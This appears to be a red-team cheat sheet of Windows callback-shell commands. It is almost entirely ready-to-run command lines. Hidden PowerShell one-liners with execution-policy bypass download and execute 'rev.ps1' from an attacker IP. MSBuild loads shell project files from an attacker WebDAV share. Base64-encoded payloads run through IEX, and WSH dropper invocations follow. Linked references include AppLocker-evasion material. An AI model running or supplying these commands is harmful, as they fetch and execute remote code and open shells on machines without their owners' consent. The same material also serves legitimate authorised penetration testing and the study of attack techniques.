# Windows

## 01 - Command Prompt

### 1.1 - Callback Shell

#### 1.1.1 - Powershell

- System32 is for 32-bit powershell payloads

```
C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ex bypass -f file.ps1

C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f file.ps1

C:\Windows\system32\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('http://<IP>/rev.ps1')"
```

- SysWOW64 is for 64-bit powershell payloads

```
C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -f file.ps1

C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -w hidden -nologo -noni -nop -ep bypass -f file.ps1

C:\Windows\SysWOW64\WindowsPowershell\v1.0\powershell.exe -nop -w hidden -ep bypass -c "IEX(New-Object Net.Webclient).DownloadString('http://<IP>/rev.ps1')"
```

#### 1.1.2 - MSBuild

- Callback shells

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe shell.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<webdav_attacker_IP>\shell.csproj

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<webdav_attacker_IP>\shell.xml

C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe shell.xml
```

#### 1.1.2 - WSH scripts droppers

- When deploying reverse shells as droppers or toolings with the following formats

```
C:\> wscript.exe <script.js | script.vbs>

C:\> cscript.exe <script.js | script.vbs | script.cs>
```

## 02 - Powershell

### 2.1 - Basics

```
PS C:\> Get-Command <command>

PS C:\> Get-Command -Module <powershell_module>
```

### 2.2 - Base64

#### 2.2.1 - Callback Shell Connection

- Execute a callback shell

```
PS C:\> IEX ([System.Text.Encoding]::Unicode.GetString(([convert]::FromBase64String('<base64_encoded>'))))

PS C:\> IEX (iwr -UseBasicParsing http://<IP>/rev.ps1);
```

---
## References

- [[Tactics && Techniques && Procedures (TTPs) Phases/Initial Access/Delivery/Web Drive-by/C2 Frameworks/Metasploit|Metasploit Web Drive-by]]

- [[WebDAV]]

- [[4shared]]

- [ss64.com Powershell](https://ss64.com/ps/powershell.html)

- [Hacktricks: Shells - Windows](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/windows)

- [Hacking Articles: Windows Exploitation MSBuild](https://www.hackingarticles.in/windows-exploitation-msbuild/)

- [Red Team Notes: Using MSBuild to Execute Shellcode in C#](https://www.ired.team/offensive-security/code-execution/using-msbuild-to-execute-shellcode-in-c)

- [Rapid7: Metasploit Framework Applocker Evasion MSBuild](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/evasion/windows/applocker_evasion_msbuild.md)